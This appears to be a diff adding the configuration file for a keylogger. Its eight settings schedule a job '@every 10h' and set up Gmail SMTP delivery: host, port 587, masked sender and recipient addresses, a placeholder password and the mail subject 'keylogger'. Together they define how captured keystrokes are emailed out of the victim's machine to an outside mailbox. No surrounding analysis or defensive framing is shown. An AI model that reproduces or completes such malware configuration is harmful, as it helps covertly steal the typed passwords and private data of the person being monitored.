@@ -1,0 +1,8 @@
+cron_duration = "@every 10h"
+subject_mail = "keylogger"
+to_mail = "**********@gmail.com"
+user_mail = "********@gmail.com"
+from_mail = "********@gmail.com"
+host_mail = "smtp.gmail.com"
+pass_mail = "password"
+port_mail = 587
